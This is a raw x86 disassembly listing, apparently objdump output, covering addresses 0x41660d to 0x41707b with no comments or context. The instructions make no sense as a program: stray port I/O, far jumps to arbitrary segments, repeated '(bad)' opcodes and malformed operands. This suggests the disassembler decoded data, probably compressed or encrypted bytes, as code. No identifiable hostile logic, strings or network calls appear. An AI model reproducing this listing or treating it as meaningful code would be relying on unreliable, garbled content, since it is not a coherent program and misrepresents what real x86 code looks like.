  41660d:	cmp    BYTE PTR [eax+0xd],0x56
  416611:	adc    ah,al
  416613:	loope  0x416595
  416615:	mov    al,0x5b
  416617:	lahf   
  416618:	and    eax,0x85764145
  41661d:	inc    eax
  41661e:	in     eax,0x7e
  416620:	outs   dx,BYTE PTR ds:[esi]
  416621:	fsub   QWORD PTR [edx-0x3ec55e95]
  416627:	outs   dx,BYTE PTR ds:[esi]
  416628:	xchg   esp,eax
  416629:	jb     0x4165c7
  41662b:	fadd   DWORD PTR [edi]
  41662d:	cwde   
  41662e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41662f:	fdivr  DWORD PTR [edi+eiz*2+0x10479c6c]
  416636:	pop    ebp
  416637:	dec    esp
  416638:	inc    edi
  416639:	ret    
  41663a:	sub    ebp,DWORD PTR es:[edx+0x4c]
  41663e:	xchg   ebx,eax
  41663f:	push   es
  416640:	js     0x4166a3
  416642:	mov    al,BYTE PTR [ebp-0x1c]
  416645:	push   0x58be138f
  41664a:	xchg   ebx,eax
  41664b:	loope  0x41667a
  41664d:	repnz fisubr DWORD PTR [edi]
  416650:	jecxz  0x416682
  416652:	lods   al,BYTE PTR ds:[esi]
  416653:	aam    0xb3
  416655:	xrelease xchg DWORD PTR [esi],ebp
  416658:	das    
  416659:	sbb    BYTE PTR [ebp+0x7ce722ea],0x19
  416660:	jmp    0x4171:0xaff05517
  416667:	es imul ebx,ebp,0x77
  41666b:	xor    ch,BYTE PTR [edx]
  41666d:	add    eax,0x45128442
  416672:	imul   ecx,DWORD PTR [eax+0x8285c2f],0xffffffa4
  416679:	pop    edi
  41667a:	inc    ebp
  41667b:	or     eax,0x7953c9ce
  416680:	add    al,0x94
  416682:	mov    bh,0x85
  416684:	or     DWORD PTR [esi-0x77859ab],ebp
  41668a:	fwait
  41668b:	dec    eax
  41668c:	clc    
  41668d:	inc    ebp
  41668e:	jecxz  0x416671
  416690:	add    DWORD PTR [ecx],edi
  416692:	sbb    BYTE PTR [eax+0x2f],ch
  416695:	pop    edi
  416696:	bnd jge 0x4166b5
  416699:	and    BYTE PTR [ecx],bh
  41669b:	push   0xfffffff1
  41669d:	pop    es
  41669e:	jbe    0x41667a
  4166a0:	pop    ecx
  4166a1:	sbb    BYTE PTR [edi-0x2c06d38a],dh
  4166a7:	(bad)  
  4166a8:	jnp    0x416645
  4166aa:	in     al,dx
  4166ab:	call   0x7095f909
  4166b0:	stos   DWORD PTR es:[edi],eax
  4166b1:	pushf  
  4166b2:	mov    ?,ecx
  4166b4:	mov    eax,0x172c22af
  4166b9:	test   BYTE PTR [esi],al
  4166bb:	ins    BYTE PTR es:[edi],dx
  4166bc:	test   eax,0x4e558d16
  4166c1:	or     al,0x8b
  4166c3:	mov    ds:0x4b946b66,al
  4166c8:	mov    ebx,0xc497cec4
  4166cd:	mov    dh,0xd1
  4166cf:	jge    0x416702
  4166d1:	pop    ecx
  4166d2:	icebp  
  4166d3:	cdq    
  4166d4:	out    dx,eax
  4166d5:	cmp    eax,0x541d85f0
  4166da:	shr    BYTE PTR [edx+0x1ad05571],cl
  4166e0:	mov    ch,ah
  4166e2:	push   ebx
  4166e3:	stos   BYTE PTR es:[edi],al
  4166e4:	ficom  WORD PTR [ebx+esi*2]
  4166e7:	retf   0x943e
  4166ea:	push   es
  4166eb:	shl    DWORD PTR [edx],0xa1
  4166ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4166ef:	mov    ds:0x31ed444b,eax
  4166f4:	and    edx,edx
  4166f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4166f7:	mov    ecx,0x9676a3ec
  4166fc:	(bad)  
  4166fd:	push   ecx
  4166fe:	pop    esi
  4166ff:	arpl   WORD PTR [eax+0x5b313134],di
  416705:	dec    ebx
  416706:	lahf   
  416707:	mov    dl,0x61
  416709:	ds out dx,al
  41670b:	mov    ds:0x10d201e6,al
  416710:	mov    bl,0x0
	...
  416772:	add    BYTE PTR [eax],al
  416774:	(bad)  
  416775:	(bad)  
  416777:	(bad)  
  416778:	(bad)  
  41677a:	out    0xff,eax
  41677c:	sbb    edi,DWORD PTR [esp+ecx*2-0x3a]
  416780:	push   esp
  416781:	sbb    dh,cl
  416783:	pop    ds
  416784:	arpl   bp,bp
  416786:	add    BYTE PTR [eax],al
  416788:	add    eax,0x7b000001
  41678d:	enter  0x8a0a,0x32
  416791:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416792:	int    0x74
  416794:	add    eax,0x5ba05738
  416799:	jge    0x416805
  41679b:	add    al,0x4d
  41679d:	es jo  0x4167ef
  4167a0:	dec    edi
  4167a1:	test   DWORD PTR [eax+0x317f4c2f],0x3b943fef
  4167ab:	xchg   BYTE PTR [eax],bh
  4167ad:	add    DWORD PTR [esi+edi*4-0x7288b75e],ebp
  4167b4:	add    al,0x8
  4167b6:	mov    ecx,0x6826b9da
  4167bb:	leave  
  4167bc:	ret    
  4167bd:	addr16 xor bh,ch
  4167c0:	ja     0x41678c
  4167c2:	jne    0x4167a4
  4167c4:	je     0x41675a
  4167c6:	xchg   ax,ax
  4167c8:	mov    al,ds:0x4a553295
  4167cd:	out    dx,eax
  4167ce:	bound  ecx,QWORD PTR [edx]
  4167d0:	lods   eax,DWORD PTR ds:[esi]
  4167d1:	lahf   
  4167d2:	ret    
  4167d3:	adc    dh,al
  4167d5:	int3   
  4167d6:	outs   dx,BYTE PTR ds:[esi]
  4167d7:	mov    eax,ds:0x19e1ec3a
  4167dc:	clc    
  4167dd:	(bad)  
  4167de:	pop    ecx
  4167df:	sahf   
  4167e0:	out    0x72,al
  4167e2:	adc    dh,BYTE PTR [edi-0x71df7cf6]
  4167e8:	call   0xd82dfe57
  4167ed:	fmul   st,st(6)
  4167f0:	and    dl,ch
  4167f2:	scas   al,BYTE PTR es:[edi]
  4167f3:	stc    
  4167f4:	push   cs
  4167f5:	mov    al,BYTE PTR [eax+eax*2+0x7d]
  4167f9:	mov    esi,0x8bc004a7
  4167fe:	dec    esp
  4167ff:	sbb    bl,BYTE PTR [ecx-0x12]
  416802:	xor    eax,0x5fd98c7e
  416808:	or     ch,0x67
  41680b:	out    0x84,al
  41680d:	repnz nop eax
  416811:	push   ebx
  416812:	jmp    0x416877
  416814:	xor    DWORD PTR [edi],0x49
  416817:	popa   
  416818:	pop    ecx
  416819:	mov    ebp,0x44e1c10f
  41681e:	fwait
  41681f:	mov    ds:0x842fbb20,al
  416824:	mov    ecx,0x2704cc05
  416829:	adc    eax,0x136ef4a3
  41682e:	mov    ah,0xd4
  416830:	xor    BYTE PTR [edx-0x5e0e308a],0x1a
  416837:	cmp    al,0xaa
  416839:	push   ebp
  41683a:	sbb    BYTE PTR [ecx+0x1],bl
  41683d:	sub    DWORD PTR [eax-0x44],ebx
  416840:	or     BYTE PTR [ebx+0x79],ah
  416843:	adc    bh,BYTE PTR ds:0x2488ef21
  416849:	rol    BYTE PTR [esi-0x1b544b7c],cl
  41684f:	call   0x6aca:0x72257927
  416856:	mov    ah,0x78
  416858:	xchg   ebx,eax
  416859:	mov    ebx,0x75a69787
  41685e:	push   0xfffffffc
  416860:	sub    DWORD PTR [edx+0x3c],ecx
  416863:	cwde   
  416864:	ins    DWORD PTR es:[edi],dx
  416865:	in     al,dx
  416866:	add    eax,DWORD PTR [ebx-0x13]
  416869:	fwait
  41686a:	popf   
  41686b:	jns    0x41686a
  41686d:	fiadd  DWORD PTR [ebx]
  41686f:	cmp    eax,0x4f76e7cf
  416874:	inc    edi
  416875:	mov    dl,0x6c
  416877:	out    dx,al
  416878:	sahf   
  416879:	retf   
  41687a:	adc    eax,DWORD PTR [esi-0x3f]
  41687d:	inc    esi
  41687e:	fwait
  41687f:	bswap  esi
  416881:	cmc    
  416882:	loop   0x416903
  416884:	hlt    
  416885:	in     eax,dx
  416886:	dec    edx
  416887:	je     0x4168fb
  416889:	loop   0x41688c
  41688b:	or     BYTE PTR [esi-0x55],0x6d
  41688f:	mov    edi,0x82
	...
  4168f4:	shr    DWORD PTR [edi-0x4810cfa],1
  4168fa:	cmc    
  4168fb:	scas   eax,DWORD PTR es:[edi]
  4168fc:	sub    DWORD PTR [edi-0x5d],edi
  4168ff:	mov    ebp,0x8eeab378
  416904:	push   0x50000ee
  416909:	add    DWORD PTR [eax],eax
  41690b:	add    ah,ah
  41690d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41690e:	sub    ebx,edi
  416910:	jno    0x4168f7
  416912:	inc    edi
  416913:	fmul   st,st(2)
  416915:	dec    edx
  416916:	js     0x4168f9
  416918:	push   ss
  416919:	(bad)  
  41691a:	icebp  
  41691b:	loope  0x4168f2
  41691d:	ret    
  41691e:	xor    ebx,DWORD PTR [eax+0x56a5da89]
  416924:	push   esp
  416925:	mov    ah,BYTE PTR ds:[eax]
  416928:	mov    eax,DWORD PTR [esp+edi*2]
  41692b:	cmp    ecx,DWORD PTR [ecx]
  41692d:	repnz xchg ebp,eax
  41692f:	dec    ecx
  416930:	pop    esi
  416931:	jmp    0xfbed:0x72b462bb
  416938:	icebp  
  416939:	shl    DWORD PTR [edi-0x2c3e3972],1
  41693f:	scas   al,BYTE PTR es:[edi]
  416940:	dec    ebx
  416941:	ror    DWORD PTR [ebx],cl
  416943:	ins    DWORD PTR es:[edi],dx
  416944:	fld    QWORD PTR [eax+0xe]
  416947:	mov    bh,0xfd
  416949:	dec    edi
  41694a:	mov    es,WORD PTR ds:0xef14252d
  416950:	inc    ebp
  416951:	pop    ebp
  416952:	jmp    0xf1a8b6e6
  416957:	xchg   edx,eax
  416958:	cmp    ebx,DWORD PTR [eax+edi*8-0x1b]
  41695c:	pop    es
  41695d:	mov    dl,0xb4
  41695f:	lds    edi,FWORD PTR [ebx]
  416961:	or     ebx,DWORD PTR [ecx-0x1785b285]
  416967:	pop    ss
  416968:	sti    
  416969:	mov    ch,0x7
  41696b:	dec    eax
  41696c:	fcmovnb st,st(7)
  41696e:	pop    ds
  41696f:	mov    WORD PTR [ebx-0x7089606f],cs
  416975:	jbe    0x41694d
  416977:	int    0x61
  416979:	dec    ecx
  41697a:	mov    ebp,ecx
  41697c:	and    DWORD PTR [edx],esi
  41697e:	xor    DWORD PTR [edi+0x620c0d9d],esp
  416984:	dec    edi
  416985:	cld    
  416986:	fbld   TBYTE PTR [ebp-0x7c2a6318]
  41698c:	lods   eax,DWORD PTR ds:[esi]
  41698d:	popf   
  41698e:	mov    ds:0xa90c0f3,eax
  416993:	and    al,0x1b
  416995:	push   esi
  416996:	out    0xa9,eax
  416998:	inc    ebx
  416999:	mov    es,WORD PTR [ebx]
  41699b:	push   ss
  41699c:	dec    ecx
  41699d:	or     BYTE PTR [eax+ecx*4],ah
  4169a0:	scas   al,BYTE PTR es:[edi]
  4169a1:	mov    ch,BYTE PTR ds:0xc33987d9
  4169a8:	sbb    DWORD PTR [esi+0x48bf1748],esi
  4169ae:	adc    edx,DWORD PTR [esi+0x39b97d98]
  4169b4:	inc    esi
  4169b5:	mov    ds:0xa61f9e2a,eax
  4169ba:	lods   eax,DWORD PTR ds:[esi]
  4169bb:	retf   
  4169bc:	pop    edi
  4169bd:	push   ds
  4169be:	push   ds
  4169bf:	mov    edx,0xa440da20
  4169c4:	dec    ebp
  4169c5:	jmp    0x41695e
  4169c7:	xor    dl,bh
  4169c9:	mov    edx,0xb8e3b229
  4169ce:	std    
  4169cf:	cmc    
  4169d0:	nop
  4169d1:	xchg   esp,eax
  4169d2:	loop   0x416973
  4169d4:	mov    edx,0xde8c9d39
  4169d9:	xor    al,0x13
  4169db:	jp     0x416977
  4169dd:	xchg   esp,eax
  4169de:	dec    ebp
  4169df:	les    eax,FWORD PTR [eax-0x31e58038]
  4169e5:	lea    esp,[eax-0x2b0b5931]
  4169eb:	jmp    0x4169d2
  4169ed:	inc    edx
  4169ee:	out    dx,al
  4169ef:	mov    ebp,0x80696f26
  4169f4:	mov    edx,0x5fdf25a7
  4169f9:	mov    ebx,0xf2dd9afe
  4169fe:	enter  0x7f37,0xa6
  416a02:	retf   
  416a03:	es js  0x4169a1
  416a06:	ret    0x51f3
  416a09:	mov    WORD PTR [ebx-0x46a8c981],es
  416a0f:	and    ah,BYTE PTR [eax+0x0]
	...
  416a72:	add    BYTE PTR [eax],al
  416a74:	retf   
  416a75:	pusha  
  416a76:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  416a7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a7d:	mov    al,ds:0xe8610ba3
  416a82:	or     eax,0xef6d07
  416a87:	add    BYTE PTR ds:0x79000001,al
  416a8d:	les    ebx,FWORD PTR [eax-0x32]
  416a90:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a92:	jp     0x416aa3
  416a94:	dec    ebx
  416a95:	aas    
  416a96:	cs in  eax,dx
  416a98:	pop    es
  416a99:	imul   ebp,DWORD PTR [ebp-0x2e],0x59a167ee
  416aa0:	lds    edi,FWORD PTR [ebp+0x3c]
  416aa3:	ins    DWORD PTR es:[edi],dx
  416aa4:	adc    esi,DWORD PTR [ebx+eiz*2-0x4457c885]
  416aab:	ficomp WORD PTR [edx]
  416aad:	shr    BYTE PTR [ecx*2-0xe0e26f],1
  416ab4:	cmp    al,0xaf
  416ab6:	loop   0x416a7c
  416ab8:	mov    eax,ds:0x8ec70a9f
  416abd:	sub    DWORD PTR [esp+ebx*4],ebx
  416ac0:	jl     0x416b2f
  416ac2:	cmc    
  416ac3:	ret    0xe364
  416ac6:	in     eax,0xe8
  416ac8:	into   
  416ac9:	fbld   TBYTE PTR [ebp-0x1e5ffadf]
  416acf:	dec    eax
  416ad0:	retf   
  416ad1:	or     al,0x69
  416ad3:	adc    ch,BYTE PTR [edx-0x7478f697]
  416ad9:	stc    
  416ada:	push   esp
  416adb:	ret    0x669f
  416ade:	push   ecx
  416adf:	hlt    
  416ae0:	adc    al,ch
  416ae2:	js     0x416abb
  416ae4:	adc    edi,DWORD PTR [eax]
  416ae6:	out    dx,eax
  416ae7:	jbe    0x416b56
  416ae9:	jl     0x416a70
  416aeb:	cmp    al,0xf3
  416aed:	ret    
  416aee:	jno    0x416b60
  416af0:	neg    BYTE PTR [ecx+0x2a]
  416af3:	rol    DWORD PTR [edx],0xbc
  416af6:	push   ecx
  416af7:	or     dh,ch
  416af9:	shl    BYTE PTR [ebx+0x3f13ecba],1
  416aff:	out    dx,eax
  416b00:	data16 sar BYTE PTR [edi-0x6c],1
  416b04:	mov    ds,WORD PTR [eax-0x4a]
  416b07:	sub    DWORD PTR [ebp-0x6fbf62ae],ecx
  416b0d:	add    al,0x72
  416b0f:	dec    BYTE PTR [ebx-0x3ae306c3]
  416b15:	ins    BYTE PTR es:[edi],dx
  416b16:	cmp    ebp,DWORD PTR [ecx+0x2f]
  416b19:	popa   
  416b1a:	call   0xbb39:0x716b8607
  416b21:	push   cs
  416b22:	int3   
  416b23:	push   ebx
  416b24:	retf   
  416b25:	cmp    al,0x7f
  416b27:	mov    ds:0x1681f450,al
  416b2c:	add    edx,esp
  416b2e:	mov    al,0x77
  416b30:	cmp    ebx,DWORD PTR [ebx+0x28fb64f8]
  416b36:	dec    ebp
  416b37:	or     DWORD PTR [edi],ebx
  416b39:	and    BYTE PTR [ecx],cl
  416b3b:	jl     0x416ae6
  416b3d:	mov    ch,0x5b
  416b3f:	imul   edi,DWORD PTR [esi+0x2dc58641],0xffffffea
  416b46:	daa    
  416b47:	mov    ds:0x35b8d3ba,al
  416b4c:	push   ebx
  416b4d:	ins    BYTE PTR es:[edi],dx
  416b4e:	mov    edx,0xca01ef2a
  416b53:	test   DWORD PTR cs:[ecx+0x50],ebp
  416b57:	mov    esp,0x690fe75c
  416b5c:	dec    edx
  416b5d:	xor    eax,0xb6f59ed5
  416b62:	hlt    
  416b63:	sbb    eax,0xb81cb0f8
  416b68:	push   esp
  416b69:	pop    ecx
  416b6a:	retf   0xf50
  416b6d:	xchg   si,ax
  416b6f:	inc    esi
  416b70:	mov    bh,0xf5
  416b72:	popa   
  416b73:	lods   eax,DWORD PTR ds:[esi]
  416b74:	jae    0x416bc2
  416b76:	idiv   BYTE PTR [ebx+0x30394b86]
  416b7c:	push   ds
  416b7d:	pop    ebx
  416b7e:	scas   al,BYTE PTR es:[edi]
  416b7f:	mov    ebp,0x96573d79
  416b84:	or     al,BYTE PTR [esi+0x6b2a2ed0]
  416b8a:	push   ebp
  416b8b:	mov    ebp,0x35cc4db9
  416b90:	add    DWORD PTR [eax],eax
	...
  416bf2:	add    BYTE PTR [eax],al
  416bf4:	jecxz  0x416c5b
  416bf6:	push   cs
  416bf7:	test   DWORD PTR [esi-0x38a0401],0x895b70a9
  416c01:	call   0x0:0xf0726156
  416c08:	add    eax,0xe2000001
  416c0d:	sub    DWORD PTR ds:0x1d104b11,edx
  416c13:	mov    edx,0x6b18ca0e
  416c18:	pop    ss
  416c19:	aaa    
  416c1a:	inc    esi
  416c1b:	adc    ebp,DWORD PTR [ebx+0x29eb8165]
  416c21:	stc    
  416c22:	add    BYTE PTR [esi-0x46],0x4
  416c26:	pop    ds
  416c27:	mov    WORD PTR [eax-0x16b58a16],ss
  416c2d:	add    edi,edi
  416c2f:	jp     0x416c5c
  416c31:	in     eax,0xc8
  416c33:	mov    gs,edi
  416c35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c36:	xchg   esi,eax
  416c37:	xor    BYTE PTR [edi+eax*2+0x77],ch
  416c3b:	dec    esp
  416c3c:	push   edi
  416c3d:	inc    edx
  416c3e:	sbb    DWORD PTR [ebx],ebp
  416c40:	push   esp
  416c41:	cmp    edi,DWORD PTR [ebx+0x4e]
  416c44:	pop    edi
  416c45:	add    ecx,DWORD PTR [edx]
  416c47:	adc    eax,0x2b26f634
  416c4c:	ror    BYTE PTR [esi-0x3e],1
  416c4f:	cmp    al,0x50
  416c51:	xchg   ebx,eax
  416c52:	test   DWORD PTR [ebx-0x48],eax
  416c55:	stos   DWORD PTR es:[edi],eax
  416c56:	scas   al,BYTE PTR es:[edi]
  416c57:	sub    al,0x22
  416c59:	aaa    
  416c5a:	dec    esi
  416c5b:	pop    ebp
  416c5c:	fdiv   st,st(1)
  416c5e:	das    
  416c5f:	mov    cl,0x8f
  416c61:	push   ecx
  416c62:	pop    esi
  416c63:	jmp    0x416c0d
  416c65:	out    dx,al
  416c66:	std    
  416c67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c68:	out    0xc5,eax
  416c6a:	add    ch,BYTE PTR [eax-0x12f140]
  416c70:	jmp    0xd154:0x22cde9e0
  416c77:	nop
  416c78:	push   ds
  416c79:	jmp    0xe291:0x661a4c6d
  416c80:	ror    DWORD PTR [edi],cl
  416c82:	lods   eax,DWORD PTR ds:[esi]
  416c83:	pushf  
  416c84:	ja     0x416c58
  416c86:	cli    
  416c87:	sbb    BYTE PTR [edx-0x42eeaa5],al
  416c8d:	ds cli 
  416c8f:	imul   esi,DWORD PTR [ebx+0x31687b4c],0xffffff80
  416c96:	add    esi,DWORD PTR [esi]
  416c98:	and    DWORD PTR [edx],ebx
  416c9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c9b:	lods   al,BYTE PTR ds:[esi]
  416c9c:	cmc    
  416c9d:	mov    ebp,0x4db06949
  416ca2:	iret   
  416ca3:	inc    eax
  416ca4:	(bad)  
  416ca5:	adc    BYTE PTR [ecx-0x53e38d61],0xa0
  416cac:	jae    0x416cbc
  416cae:	int3   
  416caf:	jae    0x416c71
  416cb1:	nop
  416cb2:	fs push esp
  416cb4:	and    al,0x91
  416cb6:	mov    eax,ds:0xbc8c9b24
  416cbb:	(bad)  
  416cbc:	or     eax,0x7d6abdd3
  416cc1:	(bad)  
  416cc2:	cmp    DWORD PTR [edi],ecx
  416cc4:	cmc    
  416cc5:	dec    ecx
  416cc6:	sar    DWORD PTR [esi],cl
  416cc8:	mov    DWORD PTR [ecx-0x4e],0x90cf24a6
  416ccf:	das    
  416cd0:	rol    ebp,1
  416cd2:	sar    BYTE PTR [edi],cl
  416cd4:	push   edi
  416cd5:	sub    al,0x97
  416cd7:	imul   BYTE PTR [edx]
  416cd9:	adc    esp,DWORD PTR [ecx+0x21]
  416cdc:	push   ebp
  416cdd:	or     ecx,esp
  416cdf:	ins    BYTE PTR es:[edi],dx
  416ce0:	adc    BYTE PTR [edi],dl
  416ce2:	stc    
  416ce3:	test   BYTE PTR [eax],al
  416ce5:	loope  0x416d3b
  416ce7:	arpl   ax,si
  416ce9:	pushf  
  416cea:	inc    esi
  416ceb:	jo     0x416cbc
  416ced:	push   ebp
  416cee:	test   al,0xab
  416cf0:	std    
  416cf1:	sub    al,0x39
  416cf3:	fdiv   DWORD PTR [ebp-0x15]
  416cf6:	jno    0x416d32
  416cf8:	dec    esi
  416cf9:	sbb    bl,BYTE PTR es:0x2a2d126b
  416d00:	jmp    0xde5d:0x6fca73c9
  416d07:	cmp    eax,0x5995bffb
  416d0c:	fcomp  QWORD PTR ss:[esi]
  416d0f:	sub    DWORD PTR [eax+0x0],0x0
	...
  416d71:	add    BYTE PTR [eax],al
  416d73:	add    BYTE PTR [ecx],ah
  416d75:	xchg   ebx,eax
  416d76:	mov    DWORD PTR [edi-0x60d84045],ebp
  416d7c:	mov    ch,0x99
  416d7e:	pop    edx
  416d7f:	das    
  416d80:	or     eax,0x77e89f0b
  416d85:	icebp  
  416d86:	add    BYTE PTR [eax],al
  416d88:	add    eax,0x24000001
  416d8d:	out    0x7,al
  416d8f:	mov    al,0x38
  416d91:	pop    ss
  416d92:	jne    0x416de2
  416d94:	or     BYTE PTR [edx],0x88
  416d97:	(bad)
  416d9b:	jns    0x416dab
  416d9d:	and    DWORD PTR [esi+0x6c7a680],esp
  416da3:	dec    eax
  416da4:	clc    
  416da5:	push   esp
  416da6:	xor    BYTE PTR [ecx],0x9b
  416da9:	(bad)  
  416daa:	std    
  416dab:	xchg   ecx,eax
  416dac:	jle    0x416dd0
  416dae:	scas   al,BYTE PTR es:[edi]
  416daf:	js     0x416dd2
  416db1:	jae    0x416df9
  416db3:	add    eax,0xb30b8d40
  416db8:	shl    DWORD PTR [edi+0xb],0xeb
  416dbc:	arpl   WORD PTR [ebp-0x306cc80f],ax
  416dc2:	sub    edi,edx
  416dc4:	inc    edi
  416dc5:	mov    bh,0x8f
  416dc7:	in     al,dx
  416dc8:	int3   
  416dc9:	sti    
  416dca:	cmovle ebp,DWORD PTR [edx]
  416dcd:	adc    al,0x9c
  416dcf:	push   esp
  416dd0:	imul   eax,DWORD PTR [ebp+0x1d],0xd52f2f76
  416dd7:	pop    ss
  416dd8:	in     al,dx
  416dd9:	push   eax
  416dda:	lea    edi,[ebp-0x5042776]
  416de0:	into   
  416de1:	xchg   ebp,eax
  416de2:	sub    al,0xe
  416de4:	fadd   QWORD PTR [ebx]
  416de6:	sub    al,0x6d
  416de8:	add    eax,0xd2a56b5f
  416ded:	sub    al,0xb
  416def:	xchg   BYTE PTR [ecx],dh
  416df1:	aam    0x79
  416df3:	lods   al,BYTE PTR ds:[esi]
  416df4:	xchg   ecx,eax
  416df5:	retf   0xe0e0
  416df8:	xchg   ebp,eax
  416df9:	mov    ah,0x47
  416dfb:	jno    0x416d86
  416dfd:	std    
  416dfe:	cli    
  416dff:	repnz pop ebx
  416e01:	jmp    0x85907a4e
  416e06:	pop    ebx
  416e07:	outs   dx,DWORD PTR ds:[esi]
  416e08:	dec    edi
  416e09:	mov    ds:0x51a6174b,al
  416e0e:	lock ja 0x416dc0
  416e11:	call   0xba2d:0xb1c54f3c
  416e18:	addr16 pop ecx
  416e1a:	push   ebp
  416e1b:	sub    al,0x61
  416e1d:	imul   ebx,ecx,0x60d768b3
  416e23:	adc    BYTE PTR [eax+0x5c12a999],ch
  416e29:	dec    ecx
  416e2a:	jmp    0x1690167
  416e2f:	cmp    esi,ecx
  416e31:	out    0x3a,eax
  416e33:	push   esi
  416e34:	test   cl,bh
  416e36:	xchg   esp,eax
  416e37:	adc    BYTE PTR [edi-0x71],bh
  416e3a:	inc    eax
  416e3b:	push   0x4550b5b8
  416e40:	push   ss
  416e41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e42:	push   ebx
  416e43:	pop    edi
  416e44:	clc    
  416e45:	(bad)  
  416e46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e47:	outs   dx,DWORD PTR ds:[esi]
  416e48:	mov    al,0x25
  416e4a:	mov    ch,0xce
  416e4c:	js     0x416eb3
  416e4e:	in     al,dx
  416e4f:	or     ebx,DWORD PTR [edi+ebx*4]
  416e52:	in     al,dx
  416e53:	mov    ?,edx
  416e55:	mov    bh,0x2d
  416e57:	jne    0x416ea1
  416e59:	pusha  
  416e5a:	add    al,BYTE PTR [esi-0x76]
  416e5d:	cli    
  416e5e:	std    
  416e5f:	sub    esp,ebp
  416e61:	fst    QWORD PTR [eax-0x5b66fcfe]
  416e67:	ror    al,0x49
  416e6a:	loopne 0x416e64
  416e6c:	mov    esp,0x67ac7dc3
  416e71:	push   esi
  416e72:	ss push 0xbefd6a37
  416e78:	mov    esp,0x4d18f009
  416e7d:	ds push ebx
  416e7f:	cmp    dh,BYTE PTR [edi-0x3b]
  416e82:	fiadd  DWORD PTR [eax+0x4904637c]
  416e88:	(bad)  
  416e89:	jmp    0x81548a4b
  416e8e:	cwde   
  416e8f:	or     ebp,DWORD PTR [ecx]
	...
  416ef1:	add    BYTE PTR [eax],al
  416ef3:	add    BYTE PTR [edi-0x519271e7],bh
  416ef9:	(bad)  
  416efa:	(bad)  
  416efb:	fucomi st,st(0)
  416efd:	xor    eax,0xc6588eea
  416f02:	adc    esi,DWORD PTR [eax+0xf27c]
  416f08:	add    eax,0xf1000001
  416f0d:	(bad)  
  416f0f:	mov    cl,cl
  416f11:	mov    al,ds:0x551b1ef1
  416f16:	push   0x14a09bec
  416f1b:	bound  eax,QWORD PTR [ebx]
  416f1d:	cwde   
  416f1e:	xchg   esi,eax
  416f1f:	jbe    0x416f80
  416f21:	fidiv  WORD PTR [edx]
  416f23:	and    al,0x7a
  416f25:	es leave 
  416f27:	mov    ebx,0x43c1928c
  416f2c:	iret   
  416f2d:	cmp    bl,ch
  416f2f:	lods   eax,DWORD PTR ds:[esi]
  416f30:	pop    ecx
  416f31:	arpl   bx,sp
  416f33:	jmp    0x416f50
  416f35:	(bad)  
  416f36:	(bad)  
  416f37:	popa   
  416f38:	push   es
  416f39:	pop    es
  416f3a:	cmp    eax,0xfbddd2a9
  416f3f:	adc    dl,0x21
  416f42:	hlt    
  416f43:	shl    BYTE PTR [edx],cl
  416f45:	mov    ebp,0xff628ba
  416f4a:	pop    ecx
  416f4b:	mov    al,ds:0xfe350071
  416f50:	mov    ecx,0x28431d7d
  416f55:	outs   dx,BYTE PTR ds:[esi]
  416f56:	jmp    esi
  416f58:	xchg   esi,eax
  416f59:	loope  0x416f83
  416f5b:	iret   
  416f5c:	lea    ebx,[esi-0x71]
  416f5f:	imul   ebx,DWORD PTR [esi],0xe
  416f62:	or     dl,BYTE PTR [edx-0x2b]
  416f65:	shl    BYTE PTR [ebp+0x3232d39f],1
  416f6b:	es out dx,eax
  416f6d:	sti    
  416f6e:	push   edx
  416f6f:	test   DWORD PTR [edx+0x34b03f1],edx
  416f75:	dec    edx
  416f76:	push   ss
  416f77:	jmp    0x416f4c
  416f79:	clc    
  416f7a:	sub    al,0x6c
  416f7c:	push   ss
  416f7d:	jmp    0x416f5e
  416f7f:	enter  0x282a,0xb9
  416f83:	mov    eax,ds:0xafbb5ef0
  416f88:	xchg   edi,eax
  416f89:	aaa    
  416f8a:	cmp    eax,0x89c87e7e
  416f8f:	xchg   ecx,eax
  416f90:	pop    ebp
  416f91:	in     al,dx
  416f92:	push   esi
  416f93:	and    ebx,ebx
  416f95:	push   ss
  416f96:	xor    eax,0x89790d54
  416f9b:	mov    dh,0x1b
  416f9d:	add    al,0xb1
  416f9f:	sar    ah,cl
  416fa1:	ins    BYTE PTR es:[edi],dx
  416fa2:	(bad)  
  416fa3:	mov    edx,0xc16f354f
  416fa8:	nop
  416fa9:	test   eax,0x6eb34a4f
  416fae:	int    0xcc
  416fb0:	pushfw 
  416fb2:	add    BYTE PTR [esi],dh
  416fb4:	sahf   
  416fb5:	jb     0x416feb
  416fb7:	add    ebp,DWORD PTR [edi]
  416fb9:	arpl   WORD PTR [ebx*8-0x3a767c2],bp
  416fc0:	in     eax,dx
  416fc1:	dec    edx
  416fc2:	mov    dh,0xd8
  416fc4:	add    BYTE PTR ds:0x263d7221,dh
  416fca:	jmp    0x417009
  416fcc:	lods   al,BYTE PTR ds:[esi]
  416fce:	mov    esi,DWORD PTR [edi+0x35b57ca3]
  416fd4:	aas    
  416fd5:	mov    bh,0xa
  416fd7:	xor    al,0x51
  416fd9:	add    eax,0xc7074f93
  416fde:	vandnpd xmm6,xmm6,XMMWORD PTR [eax+0xe82432f]
  416fe7:	mov    dh,0xd0
  416fe9:	in     al,0xb0
  416feb:	jge    0x417047
  416fed:	cld    
  416fee:	mov    ds:0x25821a62,eax
  416ff3:	ja     0x416f75
  416ff5:	ret    0xe080
  416ff8:	jmp    0xb788:0x3e202e1d
  416fff:	xor    DWORD PTR [edx],ebp
  417001:	mov    ah,0x4e
  417003:	fs das 
  417005:	enter  0xb060,0x51
  417009:	and    edi,DWORD PTR [ecx]
  41700b:	jno    0x417086
  41700d:	mov    bl,0x75
  41700f:	ja     0x41707f
	...
  417071:	add    BYTE PTR [eax],al
  417073:	add    BYTE PTR [esi+0x2d],dh
  417076:	push   ebp
  417077:	inc    ecx
  417078:	pop    edi
  417079:	jns    0x4170f1
  41707b:	aas    
